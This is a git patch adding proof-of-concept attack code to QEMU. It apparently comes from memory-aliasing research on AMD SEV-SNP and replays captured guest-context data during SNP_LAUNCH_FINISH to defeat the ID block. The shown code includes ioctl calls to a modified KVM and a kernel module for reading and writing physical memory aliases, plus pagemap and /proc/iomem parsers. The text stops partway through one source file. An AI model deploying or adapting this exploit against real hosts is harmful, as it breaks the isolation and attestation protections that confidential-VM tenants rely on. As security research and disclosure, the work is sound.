@@ -1,0 +1,1575 @@
+From ca83ebea4ea6ec6c80f3514830afdec88528df86 Mon Sep 17 00:00:00 2001
+From: Luca Wilke <l.wilke@uni-luebeck.de>
+Date: Tue, 2 Apr 2024 12:42:42 +0200
+Subject: [PATCH] PoC for replaying gctx in snp_launch_finish to defeat id
+ block scenario
+
+There is copy pasted code from the badram repo (see meson.build) . The clean way would be to sub repo and to link against the application
+
+The attack is controlled by three environment variables:
+-BADRAM_ALIAS_CSV  : path to csv file with alias defintions for badram. Defaults to "./edited-aliases.csv"
+- BADRAM_DUMP_DIR : path where we dump the guest context at various states. Usefull for replaying, but we can a capture by other means. Defaults to "./"
+- BADRAM_REPLAY_DATA :data to binary file which should get replayed. Defaults to "./replay-with-this.bin". This file may not be present, in which case we don't carry out the attack. The file must be exactly 0x40 bytes and will be replayed to offset 0x460 off the gctx page
+---
+ .gitmodules                     |   3 +
+ target/i386/badram_get_gctx.c   |  65 +++++++
+ target/i386/badram_get_gctx.h   |  37 ++++
+ target/i386/helpers.c           |  56 ++++++
+ target/i386/helpers.h           |  42 ++++
+ target/i386/mem_range_repo.c    | 123 ++++++++++++
+ target/i386/mem_range_repo.h    |  30 +++
+ target/i386/meson.build         |  13 +-
+ target/i386/parse_pagemap.c     |  73 +++++++
+ target/i386/parse_pagemap.h     |  21 ++
+ target/i386/proc_iomem_parser.c | 148 ++++++++++++++
+ target/i386/proc_iomem_parser.h |  47 +++++
+ target/i386/readalias.c         | 331 ++++++++++++++++++++++++++++++++
+ target/i386/readalias.h         | 126 ++++++++++++
+ target/i386/readalias_ioctls.h  |  38 ++++
+ target/i386/sev.c               | 230 ++++++++++++++++++++++
+ 16 files changed, 1382 insertions(+), 1 deletion(-)
+ create mode 100644 target/i386/badram_get_gctx.c
+ create mode 100644 target/i386/badram_get_gctx.h
+ create mode 100644 target/i386/helpers.c
+ create mode 100644 target/i386/helpers.h
+ create mode 100644 target/i386/mem_range_repo.c
+ create mode 100644 target/i386/mem_range_repo.h
+ create mode 100644 target/i386/parse_pagemap.c
+ create mode 100644 target/i386/parse_pagemap.h
+ create mode 100644 target/i386/proc_iomem_parser.c
+ create mode 100644 target/i386/proc_iomem_parser.h
+ create mode 100644 target/i386/readalias.c
+ create mode 100644 target/i386/readalias.h
+ create mode 100644 target/i386/readalias_ioctls.h
+
+diff --git a/.gitmodules b/.gitmodules
+index 73cae4cd4d..e88a5815a4 100644
+--- a/.gitmodules
++++ b/.gitmodules
+@@ -43,3 +43,6 @@
+ [submodule "tests/lcitool/libvirt-ci"]
+ 	path = tests/lcitool/libvirt-ci
+ 	url = https://gitlab.com/libvirt/libvirt-ci.git
++[submodule "badram"]
++	path = badram
++	url = git@github.com:JesseDeMeulemeester/badram.git
+diff --git a/target/i386/badram_get_gctx.c b/target/i386/badram_get_gctx.c
+new file mode 100644
+index 0000000000..0e6baccbe8
+--- /dev/null
++++ b/target/i386/badram_get_gctx.c
+@@ -0,0 +1,65 @@
++#include "badram_get_gctx.h"
++
++#include <sys/ioctl.h>
++#include <fcntl.h>
++#include <unistd.h>
++
++#include "helpers.h"
++
++//TODO: when merging this back into the lib, use the kernel uapi
++//headers instead of this copy paste
++
++
++struct kvm_badram_get_gctx_args {
++	// pid of the QEMU process running the VM
++	uint64_t qemupid;
++	//Output parameter filled with the PA of the guest context page
++	uint64_t out_gctx_pa;
++};
++
++#define KVMIO 0xAE
++#define KVM_BADRAM_GET_GCTX_PA _IOWR(KVMIO, 0xdb, struct kvm_badram_get_gctx_args)
++
++#define KVM_BADRAM_REPLAY_GCTX _IOWR(KVMIO, 0xdc, struct badram_gctx_replay_args)
++
++
++int badram_get_gctx(uint64_t qemupid, uint64_t* out_gctx_pa) {
++	int kvm_fd = -1;
++
++	struct kvm_badram_get_gctx_args args = {
++		.qemupid = qemupid,
++		.out_gctx_pa = 0,
++	};
++
++	
++	if( -1 == (kvm_fd = open("/dev/kvm", O_RDWR|O_CLOEXEC))) {
++		err_log("failed to open kvm file\n");
++		return -1;
++	}
++
++	if(ioctl(kvm_fd, KVM_BADRAM_GET_GCTX_PA, &args)) {
++		err_log("KVM_BADRAM_GET_GCTX_PA failed\n");
++		close(kvm_fd);
++		return -1;
++	}
++	close(kvm_fd);
++	*out_gctx_pa = args.out_gctx_pa;
++	return 0;
++}
++
++int badram_request_gctx_replay(struct badram_gctx_replay_args args) {
++	int kvm_fd = -1;
++
++	if( -1 == (kvm_fd = open("/dev/kvm", O_RDWR|O_CLOEXEC))) {
++		err_log("failed to open kvm file\n");
++		return -1;
++	}
++
++	if(ioctl(kvm_fd, KVM_BADRAM_REPLAY_GCTX, &args)) {
++		err_log("KVM_BADRAM_GET_GCTX_PA failed\n");
++		close(kvm_fd);
++		return -1;
++	}
++	close(kvm_fd);
++	return 0;
++}
+diff --git a/target/i386/badram_get_gctx.h b/target/i386/badram_get_gctx.h
+new file mode 100644
+index 0000000000..807b2c17f2
+--- /dev/null
++++ b/target/i386/badram_get_gctx.h
+@@ -0,0 +1,37 @@
++#ifndef BADRAM_GET_GCTX_H
++#define BADRAM_GET_GCTX_H
++
++#include <stdint.h>
++
++
++
++/**
++ @brief Get the PA of guest context page that the HV donated to
++the PSP for the givem VM
++@parameters qemupid : PID of the qemu process controlling the VM
++@parameters out_gctx_pa : Output paramter, filled with PA of the guest
++context
++@returns 0 on success
++*/
++int badram_get_gctx(uint64_t qemupid, uint64_t* out_gctx_pa);
++
++
++
++struct badram_gctx_replay_args {
++	//userspace pointer to data that should get replayed
++	uint8_t* data;
++	//length of data
++	uint64_t data_len;
++	//offset inside the gctx page where we should replay
++	uint64_t gctx_offset;
++	//expected pa of the gctx.
++	uint64_t expected_gctx_pa;
++	//alias for the gctx
++	uint64_t gctx_alias_pa;
++};
++/**
++ @brief Request replay of the given data during the SNP_LAUNCH_FINISH
++ command
++*/
++int badram_request_gctx_replay(struct badram_gctx_replay_args args);
++#endif
+diff --git a/target/i386/helpers.c b/target/i386/helpers.c
+new file mode 100644
+index 0000000000..aaf7b47f65
+--- /dev/null
++++ b/target/i386/helpers.c
+@@ -0,0 +1,56 @@
++#include "helpers.h"
++#include "proc_iomem_parser.h"
++#include <fcntl.h>
++#include <limits.h>
++#include <stdlib.h>
++#include <errno.h>
++#include <unistd.h>
++
++static int randomfd = -1;
++
++int get_rand_bytes(void *p, size_t len) {
++  if (randomfd == -1) {
++    randomfd = open("/dev/urandom", O_RDWR);
++    if (randomfd < 0) return randomfd;
++  }
++
++  size_t nb_read = read(randomfd, p, len);
++
++  return nb_read != len;
++}
++
++void hexdump(uint8_t* a, const size_t n)
++{
++	for(size_t i = 0; i < n; i++) {
++    if (a[i]) printf("\x1b[31m%02x \x1b[0m", a[i]);
++    else printf("%02x ", a[i]);
++    if (i % 64 == 63) printf("\n");
++  }
++	printf("\n");
++}
++
++int do_stroul(char *str, int base, uint64_t *result)
++{
++    (*result) = strtoul(str, NULL, base);
++    // if commented in, we cannot enter zero, as uses zero as an error case. it's just stupid
++    /*if ((*result) == 0) {
++      printf("line %d: failed to convert %s to uint64_t\n", __LINE__, str);
++      return 0;
++    }*/
++    if ((*result) == ULLONG_MAX && errno == ERANGE)
++    {
++        err_log( "failed to convert %s to uint64_t. errno was ERANGE\n", str);
++        return -1;;
++    }
++    return 0;
++}
++
++int get_alias(uint64_t pa, mem_range_t* mrs, uint64_t* alias_masks, size_t len, uint64_t* out_alias) {
++  for(size_t i = 0; i < len; i++) {
++    if( (pa >= mrs[i].start) && (pa < mrs[i].end) ) {
++      *out_alias = pa ^ alias_masks[i];
++      return 0;
++    }
++  }
++  return -1;
++}
+diff --git a/target/i386/helpers.h b/target/i386/helpers.h
+new file mode 100644
+index 0000000000..d7ad2fee2c
+--- /dev/null
++++ b/target/i386/helpers.h
+@@ -0,0 +1,42 @@
++#ifndef HELPERS_H
++#define HELPERS_H
++
++#include <stdio.h>
++#include <stdint.h>
++
++#include "proc_iomem_parser.h"
++
++#define err_log(fmt, ...) fprintf(stderr, "%s:%d : " fmt, __FILE__, __LINE__, ##__VA_ARGS__);
++
++/**
++ * @brief Read len random bytes from urandom into p
++*/
++int get_rand_bytes(void *p, size_t len);
++
++/**
++ * @brief Print next n bytes of a
++*/
++void hexdump(uint8_t* a, const size_t n);
++
++/**
++ * @brief Wrapper with error handling around strtoul
++ *
++ * @param str string to parse as number
++ * @param base as described in strtoul doc
++ * @param result result param
++ * @return 0 on success
++ */
++int do_stroul(char *str, int base, uint64_t *result);
++
++
++/**
++ * @brief Compute the alias for the given pa
++ * @brief mrs: memory range with known alias masks
++ * @brief alias_masks: value to xor to an addr from the corresponding memory range to get the aliased pa
++ * @rief len: length of mrs and alias_masks (i.e. both have this length)
++ * @brief out_alias: Output param, filled with the alias pa
++ * @returns: 0 on success
++*/
++int get_alias(uint64_t pa, mem_range_t* mrs, uint64_t* alias_masks, size_t len, uint64_t* out_alias);
++
++#endif
+diff --git a/target/i386/mem_range_repo.c b/target/i386/mem_range_repo.c
+new file mode 100644
+index 0000000000..91b2c361b6
+--- /dev/null
++++ b/target/i386/mem_range_repo.c
+@@ -0,0 +1,123 @@
++#include "mem_range_repo.h"
++
++int write_csv(char* path, mem_range_t* mr, uint64_t* alias_masks,  size_t len) {
++  FILE* f = fopen(path, "w");
++  if(!f) {
++    err_log("Failed to create file %s : %s", path, strerror(errno))
++    return -1;
++  }
++
++  //write csv header
++  if(-1 == fprintf(f,"#start pa, end pa, alias xor mask\n")){
++    err_log("failed to write : %s\n", strerror(errno));
++    fclose(f);
++    return -1;
++  }
++  //write csv data
++  for(size_t i = 0; i < len; i++) {
++    if( -1 == fprintf(f, "0x%jx,0x%jx,0x%jx\n", mr[i].start, mr[i].end, alias_masks[i])) {
++      err_log("failed to write : %s\n", strerror(errno));
++      fclose(f);
++      return -1;
++    }
++  }
++
++  fclose(f);
++  return 0;
++}
++
++
++int parse_csv(char* path, mem_range_t** out_mr, uint64_t** out_alias_masks, size_t* out_len) {
++  FILE* f = fopen(path, "r");
++  char* buf = NULL;
++  mem_range_t* mr = NULL;
++  uint64_t* alias_masks = NULL;
++  size_t idx;
++  int retval = 0;
++  if(!f) {
++    err_log("Failed to open %s for reading : %s\n", path, strerror(errno));
++    return -1;
++  }
++
++  //iterate over file to get number of entries. Afterwards alloc result
++  //array and iterate over file again
++  size_t len = 0;
++  uint64_t dummy;
++  size_t buf_bytes = 512;
++  buf = (char*)malloc(buf_bytes);
++  if( fgets(buf, buf_bytes, f) == NULL ) {
++    err_log("Failed to read header row : %s\n", strerror(errno));
++    goto error;
++  }
++  if( ferror(f) ) {
++    err_log("Error reading from %s : %s\n", path, strerror(errno));
++    goto error;
++  }
++  while(  3 == fscanf(f, "0x%jx,0x%jx,0x%jx\n", &dummy, &dummy, &dummy )) {
++    len += 1;
++  }
++  if( ferror(f) ) {
++    err_log("Error reading from %s : %s\n", path, strerror(errno));
++    goto error;
++  }
++  if( fseek(f, 0, SEEK_SET)) {
++    err_log("Error resetting file position : %s\n", strerror(errno));
++    goto error;
++  }
++  if( len < 1 ) {
++    err_log("Input file %s does not contain any entries\n", path);
++    goto error;
++  }
++
++
++
++  mr = (mem_range_t*)malloc(sizeof(mem_range_t) * len);
++  alias_masks = (uint64_t*)malloc(sizeof(uint64_t) * len);
++  idx = 0;
++  if( fgets(buf, buf_bytes, f) == NULL ) {
++    err_log("Failed to read header row : %s\n", strerror(errno));
++    goto error;
++  }
++  if( ferror(f) ) {
++    err_log("Error reading from %s : %s\n", path, strerror(errno));
++    goto error;
++  }
++  while( 3 == fscanf(f, "0x%jx,0x%jx,0x%jx\n", &(mr[idx].start), &(mr[idx].end), &(alias_masks[idx]) ) ){
++    const char* dummy_name = "Not restored by parser\n";
++    memcpy(mr[idx].name, dummy_name, strlen(dummy_name));
++    idx += 1;
++  }
++  if( ferror(f) ) {
++    err_log("Error reading from %s : %s\n", path, strerror(errno));
++    goto error;
++  }
++  if( idx != len ) {
++    err_log("Expected to read %ju entries but got %ju\n", len, idx);
++    goto error;
++  }
++
++  *out_len = len;
++  *out_mr =mr;
++  *out_alias_masks = alias_masks;
++  
++  
++goto cleanup;
++error:
++  retval = -1;
++  //only free on error, otherwise we return them in output arg
++  if( mr ) {
++    free(mr);
++  }
++  if( alias_masks ) {
++    free(alias_masks);
++  }
++cleanup:
++  if(f) {
++    fclose(f);
++  }
++  if( buf ) {
++    free(buf);
++  }
++  return retval;
++  
++}
+diff --git a/target/i386/mem_range_repo.h b/target/i386/mem_range_repo.h
+new file mode 100644
+index 0000000000..725904df15
+--- /dev/null
++++ b/target/i386/mem_range_repo.h
+@@ -0,0 +1,30 @@
++#ifndef MEM_RANGE_REPO_H
++#define MEM_RANGE_REPO_H
++
++#include <stdlib.h>
++#include <string.h>
++#include <stdio.h>
++#include<errno.h>
++
++#include "helpers.h"
++#include "proc_iomem_parser.h"
++
++
++/**
++ * @brief Serialize the entries in `mr` to csv. 
++ * @return 0 on success
++*/
++int write_csv(char* path, mem_range_t* mr, uint64_t* alias_masks,  size_t len); 
++
++/**
++ * @brief Deserialize a csv file created with `write_csv` into mem_range_t and alias masks.
++ * @param path : path to csv file
++ * @param out_mr : Output parameter for the parsed memomory ranges. Caller must free
++ * @param out_alias_masks : Output parameter for the parsed alias masks. Caller must free
++ * @param out_len : Output parameter with length for `our_mr` and `our_alias_masks`
++ * @return 0 on success
++*/
++int parse_csv(char* path, mem_range_t** out_mr, uint64_t** out_alias_masks, size_t* out_len);
++
++
++#endif
+diff --git a/target/i386/meson.build b/target/i386/meson.build
+index 7c74bfa859..80e9df381f 100644
+--- a/target/i386/meson.build
++++ b/target/i386/meson.build
+@@ -20,7 +20,18 @@ i386_system_ss.add(files(
+   'monitor.c',
+   'cpu-sysemu.c',
+ ))
+-i386_system_ss.add(when: 'CONFIG_SEV', if_true: files('sev.c'), if_false: files('sev-sysemu-stub.c'))
++#TODO: pull in badram github repo via a wrap file and build+link against the lib
++i386_system_ss.add(
++  when: 'CONFIG_SEV',
++  if_true: files(
++    'sev.c',
++    'helpers.c',
++    'mem_range_repo.c',
++    'badram_get_gctx.c',
++    'proc_iomem_parser.c',
++    'parse_pagemap.c',
++    'readalias.c'),
++  if_false: files('sev-sysemu-stub.c'))
+ 
+ i386_user_ss = ss.source_set()
+ 
+diff --git a/target/i386/parse_pagemap.c b/target/i386/parse_pagemap.c
+new file mode 100644
+index 0000000000..47595155aa
+--- /dev/null
++++ b/target/i386/parse_pagemap.c
+@@ -0,0 +1,73 @@
++#include "parse_pagemap.h"
++
++
++typedef struct {
++    uint64_t pfn : 55;
++    unsigned int soft_dirty : 1;
++    unsigned int file_page : 1;
++    unsigned int swapped : 1;
++    unsigned int present : 1;
++} PagemapEntry;
++
++/* Parse the pagemap entry for the given virtual address.
++ *
++ * @param[out] entry      the parsed entry
++ * @param[in]  pagemap_fd file descriptor to an open /proc/pid/pagemap file
++ * @param[in]  vaddr      virtual address to get entry for
++ * @return 0 for success, 1 for failure
++ */
++static int pagemap_get_entry(PagemapEntry *entry, int pagemap_fd, uintptr_t vaddr)
++{
++    size_t nread;
++    ssize_t ret;
++    uint64_t data;
++    uintptr_t vpn;
++
++    vpn = vaddr / sysconf(_SC_PAGE_SIZE);
++    nread = 0;
++    while (nread < sizeof(data)) {
++        ret = pread(pagemap_fd, ((uint8_t*)&data) + nread, sizeof(data) - nread,
++                vpn * sizeof(data) + nread);
++        nread += ret;
++        if (ret <= 0) {
++            return 1;
++        }
++    }
++    entry->pfn = data & (((uint64_t)1 << 55) - 1);
++    entry->soft_dirty = (data >> 55) & 1;
++    entry->file_page = (data >> 61) & 1;
++    entry->swapped = (data >> 62) & 1;
++    entry->present = (data >> 63) & 1;
++    return 0;
++}
++
++
++int virt_to_phys_user(uintptr_t *paddr, pid_t pid, uintptr_t vaddr)
++{
++    char pagemap_file[BUFSIZ];
++    int pagemap_fd;
++
++    snprintf(pagemap_file, sizeof(pagemap_file), "/proc/%ju/pagemap", (uintmax_t)pid);
++    pagemap_fd = open(pagemap_file, O_RDONLY);
++    if (pagemap_fd < 0) {
++        close(pagemap_fd);
++        return 1;
++    }
++    PagemapEntry entry;
++    if (pagemap_get_entry(&entry, pagemap_fd, vaddr)) {
++        close(pagemap_fd);
++        return 1;
++    }
++    if( entry.pfn == 0) {
++        printf("%s:%d entry.pfn == 0 for pid=%d, vaddr=0x%jx, are we root?\n",__FILE__,__LINE__, pid, vaddr);
++        close(pagemap_fd);
++        return 1;
++    }
++    close(pagemap_fd);
++    *paddr = (entry.pfn * sysconf(_SC_PAGE_SIZE)) + (vaddr % sysconf(_SC_PAGE_SIZE));
++
++
++
++
++    return 0;
++}
+diff --git a/target/i386/parse_pagemap.h b/target/i386/parse_pagemap.h
+new file mode 100644
+index 0000000000..f4ce34803c
+--- /dev/null
++++ b/target/i386/parse_pagemap.h
+@@ -0,0 +1,21 @@
++#ifndef PARSE_PAGEMAP_H
++#define PARSE_PAGEMAP_H
++
++// From https://stackoverflow.com/questions/5748492/is-there-any-api-for-determining-the-physical-address-from-virtual-address-in-li
++#define _XOPEN_SOURCE 700
++#include <fcntl.h> /* open */
++#include <stdint.h> /* uint64_t  */
++#include <stdio.h> /* printf */
++#include <stdlib.h> /* size_t */
++#include <unistd.h> /* pread, sysconf */
++
++/* Convert the given virtual address to physical using /proc/PID/pagemap.
++ *
++ * @param[out] paddr physical address
++ * @param[in]  pid   process to convert for
++ * @param[in] vaddr virtual address to get entry for
++ * @return 0 for success, 1 for failure
++ */
++int virt_to_phys_user(uintptr_t *paddr, pid_t pid, uintptr_t vaddr);
++
++#endif
+diff --git a/target/i386/proc_iomem_parser.c b/target/i386/proc_iomem_parser.c
+new file mode 100644
+index 0000000000..1908266433
+--- /dev/null
++++ b/target/i386/proc_iomem_parser.c
+@@ -0,0 +1,148 @@
++#include "proc_iomem_parser.h"
++#include "helpers.h"
++#include <errno.h>
++#include <stdlib.h>
++#include <string.h>
++
++int _regexp_matches_to_mem_range(regmatch_t* matches, size_t matches_len, char* input_string, mem_range_t* result) {
++    if( matches_len != 4 ) {
++        err_log( "expected 4 matches but got %lu\n", matches_len);
++        return -1;
++    }
++
++    for( size_t i = 0; i < matches_len; i++) {
++        if( matches[i].rm_so == -1 ) {
++            err_log( "entry for match %lu is invalid\n", i);
++            return -1;
++        }
++        regmatch_t* m = &matches[i];
++
++        switch (i) {
++            case 0:
++            break; //nothing to do here
++            case 1: //fallthtrough
++            case 2: {
++                //do hex string to uint64_t
++                uint64_t v;
++                if( do_stroul(input_string + m->rm_so, 16, &v)) {
++                    err_log( "do_stroul failed on match group %lu\n", i);
++                }
++                if( i == 1) {
++                    result->start = v;
++                } else {
++                    result->end = v;
++                }
++            }
++            break;
++            case 3: {
++                size_t match_len = m->rm_eo - m->rm_so - 1;
++                if( input_string[m->rm_eo] == '\n') {
++                    match_len -= 1;
++                }
++                if( match_len > sizeof(result->name) ) {
++                    err_log( "match to large: %ju\n", match_len);
++                    return -1;
++                }
++                strncpy(result->name, input_string + m->rm_so, match_len);
++                result->name[match_len] = '\0';
++
++                if( 0 == strcmp("System RAM", result->name)) {
++										result->mt = MT_SYSTEM_RAM;
++                } else if( 0 == strcmp("Reserved", result->name)) {
++										result->mt = MT_RESERVED;
++								} else {
++										result->mt = MT_OTHER;
++								}
++            }
++            break;
++            default:
++                err_log( "unexpected entry index\n");
++                return -1;
++        }
++    }
++
++    return 0;
++}
++
++
++int parse_mem_layout(mem_range_t** ranges, size_t* range_len) {
++    int ret = 0;
++    const char* iomem_path = "/proc/iomem";
++    printf("Opening iomem file at %s\n", iomem_path);
++    FILE* iomem = fopen(iomem_path, "r");
++    if( iomem == NULL ) {
++        err_log( "failed to open %s : %s", iomem_path, strerror(errno));
++        goto error;
++
++    }
++
++    char line_buf[256];
++    regex_t re;
++    regmatch_t groups[4];
++    size_t groups_len = sizeof(groups)/sizeof(*groups);
++
++    //iterate over file once to get max number of entries
++    size_t results_buf_len = 0;
++    while( fgets(line_buf, sizeof(line_buf), iomem) != NULL ) {
++        results_buf_len += 1;
++    }
++    if( ferror(iomem)) {
++        err_log( "error reading from %s : %s", iomem_path, strerror(errno));
++        goto error;
++    }
++    if( fseek(iomem, 0, SEEK_SET)) {
++        err_log( "failed to reset stream to start\n");
++        goto error;
++    }
++
++    //now we know the max number of entries -> alloc result array
++    mem_range_t* results_buf = malloc(sizeof(mem_range_t) * results_buf_len);
++    size_t results_buf_next_idx = 0;
++
++
++    //main loop over each line
++    if( regcomp(&re, "^([0-9a-f]+)-([0-9a-f]+) : (.*)$", REG_EXTENDED)) {
++        err_log( "failed to parse static regexp, this should never happend\n");
++        goto error;
++    }
++    while( fgets(line_buf, sizeof(line_buf), iomem) != NULL ) {
++
++        //in either of these cases our regexp did not match and we ignore the line
++        if( regexec(&re, line_buf, groups_len, groups, 0) ) {
++            continue;
++        }
++        if( groups[0].rm_so == -1 ) {
++            continue;
++        }
++        
++        //regeexp matched, extract information
++        if( _regexp_matches_to_mem_range(groups, groups_len, line_buf, results_buf + results_buf_next_idx)) {
++            err_log( "regexp_matches_to_mem_range failed\n");
++            goto error;
++        }
++        results_buf_next_idx += 1;
++    }
++    //check if we left the loop due to I/O error
++    if( ferror(iomem)) {
++        err_log( "error reading from %s : %s", iomem_path, strerror(errno));
++        goto error;
++    }
++
++    //we overapproximated the size, resize to only hold the actually used elements
++    if( results_buf_next_idx != results_buf_len ) {
++        *ranges = malloc(sizeof(mem_range_t) * results_buf_next_idx);
++        *range_len = results_buf_next_idx;
++        memcpy(*ranges, results_buf, results_buf_next_idx * sizeof(mem_range_t));
++        free(results_buf);
++    }
++
++
++    goto cleanup;
++    error:
++        ret = -1;
++    cleanup:
++    if(iomem) {
++        fclose(iomem);
++    }
++    return ret;
++}
+diff --git a/target/i386/proc_iomem_parser.h b/target/i386/proc_iomem_parser.h
+new file mode 100644
+index 0000000000..892b2c671b
+--- /dev/null
++++ b/target/i386/proc_iomem_parser.h
+@@ -0,0 +1,47 @@
++#ifndef PROC_IOMEM_PARSER
++#define PROC_IOMEM_PARSER
++
++#include <stdint.h>
++#include <regex.h>
++#include <stdbool.h>
++
++typedef enum {
++	//Regular RAM
++	MT_SYSTEM_RAM,
++	//This should be the areas we excluded with memmap kern param
++	MT_RESERVED,
++	//Catchall for all other types. You probably should not access these
++	MT_OTHER,
++} memory_type_t;
++
++typedef struct{
++    uint64_t start;
++    uint64_t end;
++    char name[256];
++	//describe the type of this memory region
++	memory_type_t mt;
++
++} mem_range_t;
++
++/**
++ * @brief parse the regexp match into a mem_range_t
++ * 
++ * @param matches as returned by regexec
++ * @param matches_len  length of matches
++ * @param input_string string on which we matched the regexp
++ * @param result caller allocated result param
++ * @return int 0 on success
++ */
++int _regexp_matches_to_mem_range(regmatch_t* matches, size_t matches_len, char* input_string, mem_range_t* result);
++
++
++/**
++ * @brief Parses /proc/iomem and returns data in callee allocated array
++ * 
++ * @param ranges out param, filled with calle allocated result array
++ * @param range_len out param, filled with len of ranges
++ * @return int 0 on success
++ */
++int parse_mem_layout(mem_range_t** ranges, size_t* range_len);
++
++#endif
+diff --git a/target/i386/readalias.c b/target/i386/readalias.c
+new file mode 100644
+index 0000000000..b22e566bcc
+--- /dev/null
++++ b/target/i386/readalias.c
+@@ -0,0 +1,331 @@
++#include <stdbool.h>
++#include <sys/ioctl.h>
++#include <sys/param.h>
++#include <fcntl.h>
++#include <unistd.h>
++#include <stdio.h>
++
++
++#include "readalias_ioctls.h"
++#include "readalias.h"
++
++static int kmod_fd = -1;
++static int random_fd = -1;
++
++
++//err_log, _get_rand_bytes and _hexdump are copy paste from common-code but this allows
++//use to include this lib here. Since we also want to compile a lib from this code this would be confusing
++
++#define err_log(fmt, ...) fprintf(stderr, "%s:%d : " fmt, __FILE__, __LINE__, ##__VA_ARGS__);
++
++static int _get_rand_bytes(void *p, size_t len) {
++  if (random_fd == -1) {
++    random_fd = open("/dev/urandom", O_RDWR);
++    if (random_fd < 0) return random_fd;
++  }
++
++  size_t nb_read = read(random_fd, p, len);
++
++  return nb_read != len;
++}
++
++static void _hexdump(uint8_t* a, const size_t n)
++{
++	for(size_t i = 0; i < n; i++) {
++    if (a[i]) printf("\x1b[31m%02x \x1b[0m", a[i]);
++    else printf("%02x ", a[i]);
++    if (i % 64 == 63) printf("\n");
++  }
++	printf("\n");
++}
++
++static uint64_t __next_page(uint64_t pa) {
++  return ((pa >> PAGE_SHIFT) + 1) << PAGE_SHIFT;
++}
++
++int wbinvd_ac(void) {
++  if( kmod_fd < 0) {
++    err_log("%s:%d: driver not openened\n", __FILE__, __LINE__);
++    return -1;
++  }
++  struct args args = {0};
++  return ioctl(kmod_fd, WBINVD_AC, &args);
++}
++
++static int __memcpy_topa(uint64_t dst, void* src, size_t count, enum flush_method fm, page_stats_t* out_stats, bool err_on_access_fail, bool access_reserved) {
++  if (kmod_fd < 0) {
++    printf("%s:%d: driver not openened\n", __FILE__, __LINE__);
++    return -1;
++  }
++
++  // The kernel module requires that only one page can be copied to at a time.
++  uint64_t offset = dst % PAGE_SIZE;
++
++  struct args args = {
++    .pa = dst,
++    .buffer = src,
++    .count = offset ? MIN(PAGE_SIZE - offset, count) : MIN(PAGE_SIZE, count),
++    .flush = fm,
++    .access_reserved = access_reserved,
++  };
++
++  size_t remaining = count;
++
++  while  (remaining != 0) {
++    switch (ioctl(kmod_fd, MEMCPY_TOPA, &args)) {
++      case 0:
++        break;
++      case 1:
++        out_stats->reserved_pages += 1;
++        if( err_on_access_fail ) {
++          return -1;
++        }
++        break;
++      case 2:
++        out_stats->map_failed += 1;
++        if( err_on_access_fail ) {
++          return -1;
++        }
++        break;
++      default:
++        return -1;
++    }
++
++    remaining -= args.count;
++    args.pa = __next_page(args.pa);
++    args.buffer = (unsigned char*)args.buffer + args.count;
++    args.count = MIN(remaining, PAGE_SIZE);
++  }
++
++  return 0;
++}
++
++static int __memcpy_frompa(void* dst, uint64_t src, size_t count, enum flush_method fm, page_stats_t* out_stats, bool err_on_access_fail, bool access_reserved) {
++  if (kmod_fd < 0) {
++    printf("%s:%d: driver not openened\n", __FILE__, __LINE__);
++    return -1;
++  }
++
++  // The kernel module requires that only one page can be copied from at a time.
++  uint64_t offset = src % PAGE_SIZE;
++
++  struct args args = {
++    .pa = src,
++    .buffer = dst,
++    .count = offset ? MIN(PAGE_SIZE - offset, count) : MIN(PAGE_SIZE, count),
++    .flush = fm,
++    .access_reserved = access_reserved,
++  };
++
++  size_t remaining = count;
++
++  while  (remaining != 0) {
++    switch (ioctl(kmod_fd, MEMCPY_FROMPA, &args)) {
++      case 0:
++        break;
++      case 1:
++        out_stats->reserved_pages += 1;
++        if( err_on_access_fail ) {
++          return -1;
++        }
++        break;
++      case 2:
++        out_stats->map_failed += 1;
++        if(err_on_access_fail) {
++          return -1;
++        }
++        break;
++      default:
++        return -1;
++    }
++
++    remaining -= args.count;
++    args.pa = __next_page(args.pa);
++    args.buffer = (unsigned char*)args.buffer + args.count;
++    args.count = MIN(remaining, PAGE_SIZE);
++  }
++
++  return 0;
++}
++
++int open_kmod(void) {
++  if( kmod_fd == - 1) {
++    kmod_fd = open("/dev/readalias_dev", O_RDWR);
++  }
++  return kmod_fd < 0 ? kmod_fd : 0;
++}
++
++void close_kmod(void) {
++  if( kmod_fd != - 1 ) {
++    close(kmod_fd);
++    kmod_fd = - 1;
++  }
++}
++
++int memcpy_topa(uint64_t dst, void* src, size_t count, page_stats_t* out_stats, bool err_on_access_fail) {
++  return __memcpy_topa(dst, src, count, FM_NONE, out_stats, err_on_access_fail, false);
++}
++
++int memcpy_topa_ext(uint64_t dst, void* src, size_t count, struct pamemcpy_cfg* cfg) {
++  return __memcpy_topa(dst, src, count, cfg->flush_method, &(cfg->out_stats), cfg->err_on_access_fail, cfg->access_reserved);
++}
++
++int memcpy_frompa(void* dst, uint64_t src, size_t count, page_stats_t* out_stats, bool err_on_access_fail) {
++  return __memcpy_frompa(dst, src, count, FM_NONE, out_stats, err_on_access_fail, false);
++}
++
++int memcpy_frompa_ext(void* dst, uint64_t src, size_t count, struct pamemcpy_cfg* cfg) {
++  return __memcpy_frompa(dst, src , count , cfg->flush_method , &(cfg->out_stats) ,
++    cfg->err_on_access_fail , cfg->access_reserved );
++}
++
++int clflush_range(uint64_t pa, size_t count, page_stats_t* out_stats, bool err_on_access_fail) {
++  if (kmod_fd < 0) {
++    printf("%s:%d: driver not openened\n", __FILE__, __LINE__);
++    return -1;
++  }
++
++  struct args args = {
++    .pa = pa,
++  };
++
++  size_t remaining = count;
++  if (remaining % PAGE_SIZE == 0) remaining++;
++
++  while  (remaining != 0) {
++    // TODO: This might not be directly possible when the memory range is protected.
++    switch (ioctl(kmod_fd, FLUSH_PAGE, &args)) {
++      case 0:
++        break;
++      case 1:
++        out_stats->reserved_pages += 1;
++        if( err_on_access_fail ) {
++          return -1;
++        }
++        break;
++      case 2:
++        out_stats->map_failed += 1;
++        if( err_on_access_fail ) {
++          return -1;
++        }
++        break;
++      default:
++        return -1;
++    }
++
++    remaining -= MIN(remaining, PAGE_SIZE);
++    args.pa = __next_page(args.pa);
++  }
++
++  return 0;
++}
++
++
++int flush_ext(uint64_t pa, size_t count, struct pamemcpy_cfg* cfg) {
++  switch(cfg->flush_method) {
++    case FM_NONE:
++      return 0;
++    case FM_CLFLUSH:
++      return clflush_range(pa, count, &(cfg->out_stats), cfg->err_on_access_fail);
++    case FM_WBINVD:
++      return wbinvd_ac();
++    default:
++      err_log("unknown flush method %d\n", cfg->flush_method);
++      return -1;
++  }
++}
++
++int check_alias(uint64_t source_pa, uint64_t alias_candidate, struct pamemcpy_cfg* memcpy_cfg, bool verbose) {
++    const size_t msg_len = 64;
